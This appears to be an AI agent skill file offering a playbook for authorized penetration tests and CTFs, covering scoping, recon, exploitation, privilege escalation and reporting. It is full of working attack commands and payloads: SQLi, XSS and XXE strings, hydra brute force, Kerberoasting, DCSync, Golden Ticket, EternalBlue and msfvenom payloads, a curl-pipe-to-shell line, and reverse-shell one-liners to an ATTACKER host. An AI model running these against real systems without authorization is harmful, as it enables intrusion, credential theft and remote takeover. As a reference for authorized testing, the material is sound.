---
name: penetration-testing
description: "Methodology and per-target playbooks for authorized penetration tests and CTFs: scoping/rules of engagement, recon-to-report phases, and concrete tool commands for web, API, auth, cloud, SSH/SMTP, WordPress, Active Directory, and Linux/Windows privesc."
metadata:
  author: zebbern
  version: "2.0"
  risk: unknown
  source: community
---

# Penetration Testing

## Scope & Rules of Engagement (read first)
- **Written authorization required** before any testing. Confirm: in-scope targets/IPs/domains, explicit exclusions, testing window, allowed techniques (DoS? social engineering?), emergency contact, data-handling rules.
- **Access level**: Black box (no info, simulates external attacker) / Gray box (partial access, simulates insider) / White box (full access, detailed audit). Confirm which before planning.
- **Engagement type**: External, Internal, Web App, Cloud, Social Engineering, Red Team (full adversary simulation vs. assumed-breach).
- Notify hosting/cloud provider if required (AWS/Azure/GCP have pentest policies — some require pre-authorization for DoS-adjacent tests).
- Never run destructive queries/commands (DROP, DELETE, shutdown) without explicit written sign-off. Stop immediately if you hit real production user data outside scope.
- Document every action (screenshots, request/response logs) for the report. Clean up: remove webshells, test accounts, added users, scheduled tasks before close-out.

## Methodology Phases
| Phase | Goal | Core tools |
|---|---|---|
| 1. Recon | Map attack surface, passive first | whois, dig/nslookup, theHarvester, amass/subfinder, Shodan, Google dorking |
| 2. Scanning | Active enumeration of live hosts/services | nmap, masscan, nikto, whatweb, ffuf |
| 3. Vulnerability Analysis | Identify exploitable weaknesses | nuclei, Burp Scanner, manual testing per vuln class (below) |
| 4. Exploitation | Verify impact, gain access | Metasploit, sqlmap, hydra, manual PoC |
| 5. Post-Exploitation | Privesc, lateral movement, data of interest | LinPEAS/WinPEAS, Mimikatz, BloodHound |
| 6. Reporting | Evidence + remediation | see Reporting section |

### Google Hacking (passive recon)
`site:target.com filetype:pdf|xls|env|config` · `inurl:login|admin` · `intitle:"index of"`

## Network & Service Scanning
```bash
nmap -sn 192.168.1.0/24                 # host discovery
nmap -sS -p- -T4 TARGET                 # full SYN port scan
nmap -sV -sC -A TARGET                  # version/OS/default scripts
nmap --script vuln TARGET               # vuln NSE scripts
nmap --script smb-vuln-ms17-010 TARGET  # EternalBlue check
masscan -p1-65535 TARGET --rate 10000   # fast large-range scan
nikto -h http://TARGET -C all           # web server scan
whatweb -a 3 TARGET                     # tech fingerprinting
```
Recon pipeline (subdomains → live hosts → content → vulns):
```bash
subfinder -d target.com -silent | httpx -title -tech-detect -status-code | tee live.txt
cat live.txt | waybackurls | tee urls.txt        # historical URLs/params
nuclei -l live.txt -t ~/nuclei-templates/ -o nuclei.txt
```
**ffuf** (dirs/params/vhosts): `ffuf -u https://T/FUZZ -w wordlist.txt -fc 404 -rate 50` — always filter false positives (`-fc/-fs/-fw/-fr`) and rate-limit production targets.

## Web Vulnerability Classes
| Class | Detection | Standard tool/payload |
|---|---|---|
| SQL injection | `'`, `" `, `OR 1=1--`, error/boolean/time diffs | sqlmap; manual UNION/error/blind payloads |
| XSS (reflected/stored/DOM) | `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>` | Burp Repeater/Intruder; check CSP, HttpOnly |
| HTML injection | unencoded `<h1>`/`<form>` reflected | manual; precursor to XSS |
| IDOR / BOLA | increment numeric IDs, swap JSON `userId`, try alt HTTP methods | Burp Intruder (Sniper on ID param) |
| Path/directory traversal | `../../../etc/passwd`, `php://filter/convert.base64-encode/resource=` | ffuf/wfuzz with LFI wordlist (SecLists) |
| Broken authentication | weak lockout, user enumeration via error diffs, session entropy/fixation | Hydra/Burp Intruder on login; manual session analysis |
| SSRF | internal IPs in URL params (`169.254.169.254`, `127.0.0.1`) | manual; check cloud metadata endpoint |
| XXE | `<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | manual XML body injection |
| Command injection | `; ls`, `` `whoami` ``, `| cat /etc/passwd` | manual; blind via `sleep`/OOB |

### SQLi quick reference
```sql
' OR '1'='1'--              -- auth bypass / boolean true
AND 1=2--                   -- boolean false
UNION SELECT NULL,NULL--    -- column-count probe (adjust NULLs)
AND SLEEP(5)--              -- MySQL time-based blind
'; WAITFOR DELAY '0:0:5'--  -- MSSQL time-based blind
```
sqlmap automation:
```bash
sqlmap -u "http://T/page?id=1" --batch --dbs
sqlmap -u "http://T/page?id=1" -D db --tables
sqlmap -u "http://T/page?id=1" -D db -T tbl --dump
sqlmap -r request.txt --batch --dbs          # from Burp-captured request
```
Filter bypass: URL/double/unicode encoding, inline comments (`SEL/**/ECT`), case variation, whitespace substitution (`%0A`,`%09`).

### Burp Suite workflow
Proxy intercept (on/off) → modify request → Forward. Set **Target scope** to cut noise. Send interesting requests to **Repeater** (manual replay) or **Intruder** (Sniper=1 param, Pitchfork=paired lists, Cluster bomb=all combos). Community lacks the automated Scanner — Professional only.

## API Testing (REST/GraphQL/SOAP)
- Discover: `/swagger.json`, `/openapi.json`, `/graphql` introspection: `{__schema{types{name,fields{name}}}}`
- IDOR bypass tricks: wrap ID in array/object `{"id":[111]}`, send ID param twice, parameter pollution.
- Test every HTTP method on each endpoint (GET/POST/PUT/DELETE/PATCH) and every API version (`/v1`,`/v2`) — auth controls often differ.
- 403 bypass attempts: trailing slash, `..;/`, extra `?`, URL-encoded bytes, case variation.
- GraphQL: batch mutations to bypass rate limits; nested queries for DoS; `graphw00f`/`clairvoyance` if introspection disabled.

## Password Attacks
```bash
hydra -l admin -P rockyou.txt ssh://TARGET            # single user
hydra -L users.txt -P pass.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
john hash.txt --wordlist=rockyou.txt --format=nt
hashcat -m 13100 hashes.txt rockyou.txt                # Kerberoast
```
Hash modes: 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt, 13100=Kerberoast, 18200=AS-REP.

## SSH
```bash
ssh-audit TARGET                                       # config/cipher audit
hydra -L users.txt -P pass.txt ssh://TARGET -t 1 -w 5  # slow brute to avoid lockout
ssh -L 8080:internal:80 user@TARGET                     # local forward
ssh -D 1080 user@TARGET                                 # SOCKS pivot (use with proxychains)
```
Check exposed keys (`~/.ssh/id_rsa`, web-accessible backups), weak host keys, CVE-2018-15473 user enum via Metasploit `auxiliary/scanner/ssh/ssh_enumusers`.

## SMTP
```bash
nmap --script=smtp-* -p25,465,587 TARGET
nc TARGET 25; EHLO test                                 # banner + capabilities
smtp-user-enum -M VRFY -U users.txt -t TARGET            # or -M EXPN / -M RCPT
```
Open relay = `MAIL FROM:<x@ext.com>` + `RCPT TO:<y@ext.com>` succeeding without auth.

## WordPress
```bash
wpscan --url http://T --api-token TOKEN -e at,ap,u,vp,vt,cb,dbe --detection-mode aggressive
wpscan --url http://T -U admin -P rockyou.txt --password-attack xmlrpc   # faster brute
curl -s http://T/wp-json/wp/v2/users                     # REST user enum
```
Check `/xmlrpc.php` (multicall brute-force, DoS pivot), theme/plugin editor RCE with admin creds, `searchsploit wordpress plugin <name>`.

## Cloud
| Platform | Enumerate | Privesc/Exploit |
|---|---|---|
| AWS | `aws sts get-caller-identity`; `enumerate-iam.py`; Pacu, Prowler, ScoutSuite | `iam:CreateAccessKey`/`PutUserPolicy`/`AttachUserPolicy`/`PassRole`+`ec2:RunInstances` = shadow admin; metadata SSRF `169.254.169.254/latest/meta-data/iam/security-credentials/` (IMDSv2 needs `X-aws-ec2-metadata-token`); S3 `aws s3 ls`/`sync`; Lambda env-var secrets |
| Azure | `Connect-AzAccount`; `Get-MsolUser -All`; `Get-AzRoleAssignment` | `Invoke-AzVMRunCommand`; Key Vault secret dump; service-principal backdoor via `New-AzAdServicePrincipal -Role Owner` |
| GCP | `gcloud auth login`; `gcloud projects list` | IAM policy binding abuse; service-account key exfiltration |
General: check CloudTrail/activity-log status before/after (and whether you're authorized to disable it); `cloud_enum.py -k company` for cross-provider discovery.

## Active Directory
```bash
bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c all      # or SharpHound.exe -c All
GetUserSPNs.py domain/user:pass -dc-ip DC -request                      # Kerberoasting
GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC -format hashcat    # AS-REP roast
secretsdump.py domain/admin:pass@DC -just-dc-user krbtgt                # DCSync
psexec.py domain/Administrator@TARGET -hashes :NTHASH                   # pass-the-hash
```
Mimikatz: `lsadump::dcsync /user:krbtgt` → `kerberos::golden /user:Administrator /domain:x /sid:S-1-5-21-... /krbtgt:HASH /ptt` (Golden Ticket). CrackMapExec for spraying (`--continue-on-success`) and SMB signing checks. Responder + `ntlmrelayx.py -tf targets.txt -smb2support` for LLMNR/NTLM relay. Critical CVEs to check: ZeroLogon (CVE-2020-1472), PrintNightmare (CVE-2021-1675), samAccountName spoofing (CVE-2021-42278/42287).

## Metasploit
```bash
msfconsole -q
search cve:2017-0144 / search type:exploit platform:windows
use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS T; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST me; exploit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=me LPORT=4444 -f exe -o shell.exe
```
Meterpreter post-exploit: `getsystem`, `hashdump`, `migrate <pid>`, `portfwd add -l 8080 -p 80 -r internal`, `run post/windows/gather/hashdump`. `sessions -l` / `sessions -i N` to manage multiple shells.

## Linux Privilege Escalation
```bash
sudo -l                                   # check GTFOBins against allowed commands
find / -perm -u=s -type f 2>/dev/null     # SUID binaries → gtfobins.github.io
getcap -r / 2>/dev/null                   # capabilities (e.g. cap_setuid)
cat /etc/crontab; ls -la /var/spool/cron/crontabs/   # writable cron scripts
curl -L .../linpeas.sh | sh               # automated enum
```
Common wins: `sudo vim -c ':!/bin/bash'`, writable cron script appending a reverse shell, `LD_PRELOAD` when `env_keep` includes it, NFS `no_root_squash` mount + SUID shell.

## Windows Privilege Escalation
```powershell
whoami /priv; whoami /groups                       # token privileges
systeminfo | findstr /B /C:"OS"                     # patch level
.\winPEAS.exe                                       # automated enum
findstr /SI /M "password" *.xml *.ini *.txt         # cleartext creds
```
Check SeImpersonatePrivilege (SweetPotato/JuicyPotato), SeBackupPrivilege (copy NTDS.dit), unquoted service paths, weak service ACLs (PowerUp `Invoke-ServiceAbuse`), `C:\Windows\Panther\Unattend.xml` for sysprep creds, HiveNightmare (CVE-2021-36934) for SAM via shadow copy.

## Reverse Shell One-Liners
```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/bash","-i"])'
nc -e /bin/bash ATTACKER 4444
```

## Reporting Format
1. **Executive summary** — business risk, no jargon.
2. **Scope & methodology** — what was tested, access level, standard followed (PTES/OWASP/NIST).
3. **Findings** — per vuln: title, severity (CVSS), affected endpoint, request/response evidence, reproduction steps, business impact.
4. **Remediation** — concrete fix per finding, prioritized by risk.
5. **Retesting guidance** — how the fix will be verified.
Deliver findings through the agreed channel immediately for anything critical — do not wait for the final report.

## Anti-Patterns
- Scanning/exploiting without written authorization or outside the agreed scope/window.
- Skipping `--batch`/rate limits and DoS'ing the target with sqlmap, ffuf, or Hydra.
- Running kernel exploits or destructive DB queries straight on production without a snapshot/approval.
- Leaving webshells, backdoor accounts, or Golden Tickets in place after the engagement.
- Reporting an automated scanner's raw output as findings without manual verification (false positives).
